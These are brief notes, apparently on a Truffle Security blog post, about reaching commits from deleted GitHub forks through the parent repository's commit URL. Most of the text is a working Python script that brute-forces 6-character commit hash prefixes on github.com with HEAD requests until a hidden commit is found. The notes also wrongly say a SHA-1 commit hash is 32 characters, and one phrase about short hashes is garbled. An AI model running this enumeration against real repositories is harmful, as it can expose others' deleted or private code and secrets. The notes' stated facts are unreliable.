https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github

- Forked a repo
- make changes to the repo ?
- deleted the forked repo 

- changes is visible in main repo `/<user/org>/<repo>/commit/<commit_hash>`

==!!Warning==

- commit_hash is SHA-1 value which is 32 char .

- to access only 1 value is enough `07f01e`


- to bruteforce if partial hash is known
```python
import requests

base_url = "https://github.com/notevilcorp/tools/commit/"

def check_commit(hash_part):
    url = f"{base_url}{hash_part}"
    response = requests.head(url)
    if response.status_code == 200:
        print(f"Valid commit found: {url}")
        return True
    else:
        return False

def find_commit():
    # Check all possible combinations after '4b'
    hex_chars = '0123456789abcdef'
    
    for i in hex_chars:
        for j in hex_chars:
            for k in hex_chars:
                for l in hex_chars:
                    short_hash = f"4b{i}{j}{k}{l}"
                    print(f"Trying hash: {short_hash}")
                    if check_commit(short_hash):
                        return short_hash

found_hash = find_commit()

if found_hash:
    print(f"Suspicious commit found: {found_hash}")
else:
    print("No suspicious commit found starting with '4b'.")

```

